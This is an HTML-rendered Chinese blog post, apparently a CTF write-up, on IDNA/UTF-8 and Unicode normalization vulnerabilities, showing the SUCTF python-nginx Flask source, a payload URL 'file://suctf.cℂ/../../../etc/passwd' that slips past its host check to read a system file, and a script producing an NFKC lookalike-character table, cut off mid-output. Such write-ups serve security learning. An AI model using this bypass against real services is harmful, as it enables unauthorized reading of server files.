@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#d8f3ff">
+<title>遇到的编码漏洞问题</title>
+
+  <style>
+    :root { --wallpaper: url("/images/wallpaper.jpg"); }
+  </style>
+
+<link rel="stylesheet" href="/css/main.css">
+<script defer src="/js/main.js"></script>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+<body class="theme-mac js is-article-page has-wallpaper">
+  <div class="menu-bar">
+  <div class="menu-left">
+    <div class="menu-apple" id="menu-apple">
+      <button class="menu-apple-btn" id="menu-apple-btn" type="button" aria-haspopup="true" aria-expanded="false" aria-label="Apple">
+        <svg class="menu-apple-icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+          <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+        </svg>
+      </button>
+      <div class="menu-dropdown" id="menu-apple-dropdown" role="menu">
+        <button class="menu-dropdown-item" type="button" data-open="about">关于本机</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">系统设置...</button>
+        <button class="menu-dropdown-item" type="button">App Store...</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">关机...</button>
+      </div>
+    </div>
+    <span class="menu-item brand">Finder</span>
+    <span class="menu-item">File</span>
+    <span class="menu-item">Edit</span>
+    <span class="menu-item">View</span>
+    <span class="menu-item">Go</span>
+    <span class="menu-item">Window</span>
+    <span class="menu-item">Help</span>
+  </div>
+  <div class="menu-right">
+    <span class="menu-item status icon" aria-label="WeChat" title="WeChat">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M8.5 6.5c-3.2 0-5.8 2.1-5.8 4.8 0 1.7 1 3.3 2.6 4.2l-.6 2.3 2.3-1.2c.5.1 1 .2 1.5.2 3.2 0 5.8-2.1 5.8-4.8S11.7 6.5 8.5 6.5z"/>
+        <path d="M15.5 11c3.1 0 5.7 2.1 5.7 4.7 0 1.5-.8 2.9-2.2 3.8l.5 2-2.1-1.1c-.4.1-.9.1-1.4.1-3.1 0-5.7-2.1-5.7-4.7S12.4 11 15.5 11z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="QQ" title="QQ">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 18c-1.4 0-2.6 1-2.6 2.3 0 1.1 1 2.1 2.6 2.1h10c1.6 0 2.6-1 2.6-2.1 0-1.3-1.2-2.3-2.6-2.3"/>
+        <path d="M6.5 12.5c-1.2 2.1-1.7 4.2-1.7 5.5M17.5 12.5c1.2 2.1 1.7 4.2 1.7 5.5"/>
+        <path d="M12 4.2c-3.6 0-6.5 3-6.5 6.7 0 3.7 2.9 6.7 6.5 6.7s6.5-3 6.5-6.7c0-3.7-2.9-6.7-6.5-6.7z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Bluetooth" title="Bluetooth">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 6l10 10-5 4V4l5 4-10 10"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Wi-Fi" title="Wi-Fi">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M3.5 9.5a12 12 0 0 1 17 0"/>
+        <path d="M6.8 12.8a7.2 7.2 0 0 1 10.4 0"/>
+        <path d="M10.4 16.4a2.6 2.6 0 0 1 3.2 0"/>
+        <circle cx="12" cy="19" r="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Battery" title="Battery">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <rect x="3" y="7.5" width="16" height="9" rx="2"/>
+        <rect x="19" y="10" width="2" height="4" rx="1"/>
+        <rect x="5.2" y="9.6" width="11.4" height="4.8" rx="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item" id="menu-time">--:--</span>
+  </div>
+</div>
+
+
+  <main class="desktop">
+    <div class="window wide reveal" style="--delay: 120ms;">
+      <div class="window-bar">
+        <div class="traffic">
+          <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+          <span class="traffic-dot yellow"></span>
+          <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+        </div>
+        <div class="window-title">遇到的编码漏洞问题</div>
+        <div class="window-actions">
+          <a class="window-link" href="/">Desktop</a>
+          
+          
+            <a class="window-link" href="/2020/01/06/%E4%B9%8B%E5%89%8D%E7%9A%84/%E9%81%87%E5%88%B0%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">Share</a>
+          
+        </div>
+      </div>
+      <div class="window-body">
+        
+        <div class="article-head">
+          <h1 class="article-title">遇到的编码漏洞问题</h1>
+          
+            <div class="article-meta">2020-01-06</div>
+          
+        </div>
+        <article class="markdown">
+          <h4 id="1-idna与utf-8编码漏洞"><a href="#1-idna与utf-8编码漏洞" class="headerlink" title="1.idna与utf-8编码漏洞"></a>1.idna与utf-8编码漏洞</h4><p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html</a><br><a target="_blank" rel="noopener" href="https://github.com/python-hyper/hyperlink/issues/19">https://github.com/python-hyper/hyperlink/issues/19</a></p>
+<span id="more"></span>
+
+
+<p><img src="/2020/01/06/%E4%B9%8B%E5%89%8D%E7%9A%84/%E9%81%87%E5%88%B0%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/1.png"></p>
+<p>suctf-python-nginx<br>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Blueprint, request, Response, escape ,render_template</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit, unquote</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Index</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl, timeout=<span class="number">2</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit</span><br><span class="line"></span><br><span class="line"><span class="comment">#url = []</span></span><br><span class="line">url = <span class="string">&quot;file://suctf.cℂ/../../../etc/passwd&quot;</span></span><br><span class="line">host = parse.urlparse(url).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;first&#x27;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1 &#x27;</span>+host)</span><br><span class="line">parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">host = parts[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;sec&#x27;</span>)</span><br><span class="line">    exit(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2 &#x27;</span>+host)</span><br><span class="line">newhost = []</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">    newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line"><span class="comment">#去掉 url 中的空格</span></span><br><span class="line">finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">host = parse.urlparse(finalUrl).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;3 &#x27;</span>+host)</span><br><span class="line">    <span class="built_in">print</span>(finalUrl)</span><br><span class="line">    <span class="comment">#print(urllib.request.urlopen(finalUrl).read())</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;???&#x27;</span>)</span><br><span class="line">    exit(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/06/%E4%B9%8B%E5%89%8D%E7%9A%84/%E9%81%87%E5%88%B0%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/2.png"><br>解法2<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11470200.html">https://www.cnblogs.com/20175211lyz/p/11470200.html</a></p>
+<h4 id="Unicode安全问题"><a href="#Unicode安全问题" class="headerlink" title="Unicode安全问题"></a>Unicode安全问题</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5402">https://xz.aliyun.com/t/5402</a><br><a target="_blank" rel="noopener" href="https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-PAPER.pdf">https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-PAPER.pdf</a><br>在线搜索unicode<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a><br>python2构造字符对应的等效码表脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> unicodedata <span class="keyword">import</span> normalize</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    debug = <span class="literal">False</span></span><br><span class="line">    tables = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x10000</span>):</span><br><span class="line">        src = unichr(i)</span><br><span class="line">        dst = normalize(<span class="string">&#x27;NFKC&#x27;</span>, src)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(dst) &lt; <span class="number">128</span> <span class="keyword">and</span> dst != src:</span><br><span class="line">                <span class="keyword">if</span> debug:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;%s (\\u%s) -- normalize --&gt; %s (\\x%s)&quot;</span> % (</span><br><span class="line">                        src, <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>),</span><br><span class="line">                        dst, <span class="built_in">hex</span>(dst.charAt(<span class="number">0</span>))[<span class="number">2</span>:]</span><br><span class="line">                    ))</span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">in</span> tables:</span><br><span class="line">                    tables[dst].append(src)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tables[dst] = [src]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(e))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;nfctable.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">        json.dump(tables, fh)</span><br><span class="line">        <span class="built_in">print</span>(tables)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot; &quot;: [&quot;\u00a0&quot;, &quot;\u00a8&quot;, &quot;\u00af&quot;, &quot;\u00b4&quot;, &quot;\u00b8&quot;, &quot;\u02d8&quot;, &quot;\u02d9&quot;, &quot;\u02da&quot;, &quot;\u02db&quot;, &quot;\u02dc&quot;, &quot;\u02dd&quot;, &quot;\u037a&quot;, &quot;\u0384&quot;, &quot;\u0385&quot;, &quot;\u1fbd&quot;, &quot;\u1fbf&quot;, &quot;\u1fc0&quot;, &quot;\u1fc1&quot;, &quot;\u1fcd&quot;, &quot;\u1fce&quot;, &quot;\u1fcf&quot;, &quot;\u1fdd&quot;, &quot;\u1fde&quot;, &quot;\u1fdf&quot;, &quot;\u1fed&quot;, &quot;\u1fee&quot;, &quot;\u1ffd&quot;, &quot;\u1ffe&quot;, &quot;\u2000&quot;, &quot;\u2001&quot;, &quot;\u2002&quot;, &quot;\u2003&quot;, &quot;\u2004&quot;, &quot;\u2005&quot;, &quot;\u2006&quot;, &quot;\u2007&quot;, &quot;\u2008&quot;, &quot;\u2009&quot;, &quot;\u200a&quot;, &quot;\u2017&quot;, &quot;\u202f&quot;, &quot;\u203e&quot;, &quot;\u205f&quot;, &quot;\u3000&quot;, &quot;\u309b&quot;, &quot;\u309c&quot;, &quot;\ufc5e&quot;, &quot;\ufc5f&quot;, &quot;\ufc60&quot;, &quot;\ufc61&quot;, &quot;\ufc62&quot;, &quot;\ufc63&quot;, &quot;\ufe49&quot;, &quot;\ufe4a&quot;, &quot;\ufe4b&quot;, &quot;\ufe4c&quot;, &quot;\ufe70&quot;, &quot;\ufe72&quot;, &quot;\ufe74&quot;, &quot;\ufe76&quot;, &quot;\ufe78&quot;, &quot;\ufe7a&quot;, &quot;\ufe7c&quot;, &quot;\ufe7e&quot;, &quot;\uffe3&quot;], &quot;$&quot;: [&quot;\ufe69&quot;, &quot;\uff04&quot;], &quot;(&quot;: [&quot;\u207d&quot;, &quot;\u208d&quot;, &quot;\u2474&quot;, &quot;\u2475&quot;, &quot;\u2476&quot;, &quot;\u2477&quot;, &quot;\u2478&quot;, &quot;\u2479&quot;, &quot;\u247a&quot;, &quot;\u247b&quot;, &quot;\u247c&quot;, &quot;\u247d&quot;, &quot;\u247e&quot;, &quot;\u247f&quot;, &quot;\u2480&quot;, &quot;\u2481&quot;, &quot;\u2482&quot;, &quot;\u2483&quot;, &quot;\u2484&quot;, &quot;\u2485&quot;, &quot;\u2486&quot;, &quot;\u2487&quot;, &quot;\u249c&quot;, &quot;\u249d&quot;, &quot;\u249e&quot;, &quot;\u249f&quot;, &quot;\u24a0&quot;, &quot;\u24a1&quot;, &quot;\u24a2&quot;, &quot;\u24a3&quot;, &quot;\u24a4&quot;, &quot;\u24a5&quot;, &quot;\u24a6&quot;, &quot;\u24a7&quot;, &quot;\u24a8&quot;, &quot;\u24a9&quot;, &quot;\u24aa&quot;, &quot;\u24ab&quot;, &quot;\u24ac&quot;, &quot;\u24ad&quot;, &quot;\u24ae&quot;, &quot;\u24af&quot;, &quot;\u24b0&quot;, &quot;\u24b1&quot;, &quot;\u24b2&quot;, &quot;\u24b3&quot;, &quot;\u24b4&quot;, &quot;\u24b5&quot;, &quot;\u3200&quot;, &quot;\u3201&quot;, &quot;\u3202&quot;, &quot;\u3203&quot;, &quot;\u3204&quot;, &quot;\u3205&quot;, &quot;\u3206&quot;, &quot;\u3207&quot;, &quot;\u3208&quot;, &quot;\u3209&quot;, &quot;\u320a&quot;, &quot;\u320b&quot;, &quot;\u320c&quot;, &quot;\u320d&quot;, &quot;\u320e&quot;, &quot;\u320f&quot;, &quot;\u3210&quot;, &quot;\u3211&quot;, &quot;\u3212&quot;, &quot;\u3213&quot;, &quot;\u3214&quot;, &quot;\u3215&quot;, &quot;\u3216&quot;, &quot;\u3217&quot;, &quot;\u3218&quot;, &quot;\u3219&quot;, &quot;\u321a&quot;, &quot;\u321b&quot;, &quot;\u321c&quot;, &quot;\u321d&quot;, &quot;\u321e&quot;, &quot;\u3220&quot;, &quot;\u3221&quot;, &quot;\u3222&quot;, &quot;\u3223&quot;, &quot;\u3224&quot;, &quot;\u3225&quot;, &quot;\u3226&quot;, &quot;\u3227&quot;, &quot;\u3228&quot;, &quot;\u3229&quot;, &quot;\u322a&quot;, &quot;\u322b&quot;, &quot;\u322c&quot;, &quot;\u322d&quot;, &quot;\u322e&quot;, &quot;\u322f&quot;, &quot;\u3230&quot;, &quot;\u3231&quot;, &quot;\u3232&quot;, &quot;\u3233&quot;, &quot;\u3234&quot;, &quot;\u3235&quot;, &quot;\u3236&quot;, &quot;\u3237&quot;, &quot;\u3238&quot;, &quot;\u3239&quot;, &quot;\u323a&quot;, &quot;\u323b&quot;, &quot;\u323c&quot;, &quot;\u323d&quot;, &quot;\u323e&quot;, &quot;\u323f&quot;, &quot;\u3240&quot;, &quot;\u3241&quot;, &quot;\u3242&quot;, &quot;\u3243&quot;, &quot;\ufe35&quot;, &quot;\ufe59&quot;, &quot;\uff08&quot;], &quot;,&quot;: [&quot;\ufe10&quot;, &quot;\ufe50&quot;, &quot;\uff0c&quot;], &quot;0&quot;: [&quot;\u2070&quot;, &quot;\u2080&quot;, &quot;\u2189&quot;, &quot;\u24ea&quot;, &quot;\u3358&quot;, &quot;\uff10&quot;], &quot;4&quot;: [&quot;\u2074&quot;, &quot;\u2084&quot;, &quot;\u2158&quot;, &quot;\u2463&quot;, &quot;\u248b&quot;, &quot;\u32b5&quot;, &quot;\u32b6&quot;, &quot;\u32b7&quot;, &quot;\u32b8&quot;, &quot;\u32b9&quot;, &quot;\u32ba&quot;, &quot;\u32bb&quot;, &quot;\u32bc&quot;, &quot;\u32bd&quot;, &quot;\u32be&quot;, &quot;\u32c3&quot;, &quot;\u335c&quot;, &quot;\u33e3&quot;, &quot;\uff14&quot;], &quot;8&quot;: [&quot;\u2078&quot;, &quot;\u2088&quot;, &quot;\u2467&quot;, &quot;\u248f&quot;, &quot;\u32c7&quot;, &quot;\u3360&quot;, &quot;\u33e7&quot;, &quot;\uff18&quot;], &quot;&lt;&quot;: [&quot;\ufe64&quot;, &quot;\uff1c&quot;], &quot;@&quot;: [&quot;\ufe6b&quot;, &quot;\uff20&quot;], &quot;D&quot;: [&quot;\u01c4&quot;, &quot;\u01c5&quot;, &quot;\u01f1&quot;, &quot;\u01f2&quot;, &quot;\u1d30&quot;, &quot;\u2145&quot;, &quot;\u216e&quot;, &quot;\u24b9&quot;, &quot;\uff24&quot;], &quot;H&quot;: [&quot;\u1d34&quot;, &quot;\u210b&quot;, &quot;\u210c&quot;, &quot;\u210d&quot;, &quot;\u24bd&quot;, &quot;\u32cc&quot;, &quot;\u3390&quot;, &quot;\u33cb&quot;, &quot;\uff28&quot;], &quot;L&quot;: [&quot;\u013f&quot;, &quot;\u01c7&quot;, &quot;\u01c8&quot;, &quot;\u1d38&quot;, &quot;\u2112&quot;, &quot;\u216c&quot;, &quot;\u24c1&quot;, &quot;\u32cf&quot;, &quot;\uff2c&quot;], &quot;P&quot;: [&quot;\u1d3e&quot;, &quot;\u2119&quot;, &quot;\u24c5&quot;, &quot;\u3250&quot;, &quot;\u33a9&quot;, &quot;\u33d7&quot;, &quot;\u33d9&quot;, &quot;\u33da&quot;, &quot;\uff30&quot;], &quot;T&quot;: [&quot;\u1d40&quot;, &quot;\u2121&quot;, &quot;\u2122&quot;, &quot;\u24c9&quot;, &quot;\u3394&quot;, &quot;\uff34&quot;], &quot;X&quot;: [&quot;\u2169&quot;, &quot;\u216a&quot;, &quot;\u216b&quot;, &quot;\u24cd&quot;, &quot;\uff38&quot;], &quot;\\&quot;: [&quot;\ufe68&quot;, &quot;\uff3c&quot;], &quot;`&quot;: [&quot;\u1fef&quot;, &quot;\uff40&quot;], &quot;d&quot;: [&quot;\u01c6&quot;, &quot;\u01f3&quot;, &quot;\u1d48&quot;, &quot;\u2146&quot;, &quot;\u217e&quot;, &quot;\u24d3&quot;, &quot;\u3372&quot;, &quot;\u3377&quot;, &quot;\u3378&quot;, &quot;\u3379&quot;, &quot;\u3397&quot;, &quot;\u33c8&quot;, &quot;\uff44&quot;], &quot;h&quot;: [&quot;\u02b0&quot;, &quot;\u210e&quot;, &quot;\u24d7&quot;, &quot;\u3371&quot;, &quot;\u33ca&quot;, &quot;\uff48&quot;], &quot;l&quot;: [&quot;\u0140&quot;, &quot;\u01c9&quot;, &quot;\u02e1&quot;, &quot;\u2113&quot;, &quot;\u217c&quot;, &quot;\u24db&quot;, &quot;\u33d0&quot;, &quot;\u33d1&quot;, &quot;\u33d2&quot;, &quot;\u33d3&quot;, &quot;\uff4c&quot;], &quot;p&quot;: [&quot;\u1d56&quot;, &quot;\u24df&quot;, &quot;\u3376&quot;, &quot;\u3380&quot;, &quot;\u338a&quot;, &quot;\u33b0&quot;, &quot;\u33b4&quot;, &quot;\u33ba&quot;, &quot;\u33d8&quot;, &quot;\uff50&quot;], &quot;t&quot;: [&quot;\u1d57&quot;, &quot;\u24e3&quot;, &quot;\uff54&quot;], &quot;x&quot;: [&quot;\u02e3&quot;, &quot;\u2093&quot;, &quot;\u2179&quot;, &quot;\u217a&quot;, &quot;\u217b&quot;, &quot;\u24e7&quot;, &quot;\uff58&quot;], &quot;|&quot;: [&quot;\uff5c&quot;], &quot;#&quot;: [&quot;\ufe5f&quot;, &quot;\uff03&quot;], &quot;&#x27;&quot;: [&quot;\uff07&quot;], &quot;+&quot;: [&quot;\u207a&quot;, &quot;\u208a&quot;, &quot;\ufb29&quot;, &quot;\ufe62&quot;, &quot;\uff0b&quot;], &quot;/&quot;: [&quot;\uff0f&quot;], &quot;3&quot;: [&quot;\u00b3&quot;, &quot;\u00be&quot;, &quot;\u2083&quot;, &quot;\u2157&quot;, &quot;\u215c&quot;, &quot;\u2462&quot;, &quot;\u248a&quot;, &quot;\u325a&quot;, &quot;\u325b&quot;, &quot;\u325c&quot;, &quot;\u325d&quot;, &quot;\u325e&quot;, &quot;\u325f&quot;, &quot;\u32b1&quot;, &quot;\u32b2&quot;, &quot;\u32b3&quot;, &quot;\u32b4&quot;, &quot;\u32c2&quot;, &quot;\u335b&quot;, &quot;\u33e2&quot;, &quot;\u33fd&quot;, &quot;\u33fe&quot;, &quot;\uff13&quot;], &quot;7&quot;: [&quot;\u2077&quot;, &quot;\u2087&quot;, &quot;\u215e&quot;, &quot;\u2466&quot;, &quot;\u248e&quot;, &quot;\u32c6&quot;, &quot;\u335f&quot;, &quot;\u33e6&quot;, &quot;\uff17&quot;], &quot;;&quot;: [&quot;\u037e&quot;, &quot;\ufe14&quot;, &quot;\ufe54&quot;, &quot;\uff1b&quot;], &quot;?&quot;: [&quot;\u2047&quot;, &quot;\u2048&quot;, &quot;\ufe16&quot;, &quot;\ufe56&quot;, &quot;\uff1f&quot;], &quot;C&quot;: [&quot;\u2102&quot;, &quot;\u212d&quot;, &quot;\u216d&quot;, &quot;\u24b8&quot;, &quot;\u33c6&quot;, &quot;\u33c7&quot;, &quot;\uff23&quot;], &quot;G&quot;: [&quot;\u1d33&quot;, &quot;\u24bc&quot;, &quot;\u3387&quot;, &quot;\u3393&quot;, &quot;\u33ac&quot;, &quot;\u33c9&quot;, &quot;\uff27&quot;], &quot;K&quot;: [&quot;\u1d37&quot;, &quot;\u212a&quot;, &quot;\u24c0&quot;, &quot;\u3385&quot;, &quot;\u33cd&quot;, &quot;\u33ce&quot;, &quot;\uff2b&quot;], &quot;O&quot;: [&quot;\u1d3c&quot;, &quot;\u24c4&quot;, &quot;\uff2f&quot;], &quot;S&quot;: [&quot;\u2120&quot;, &quot;\u24c8&quot;, 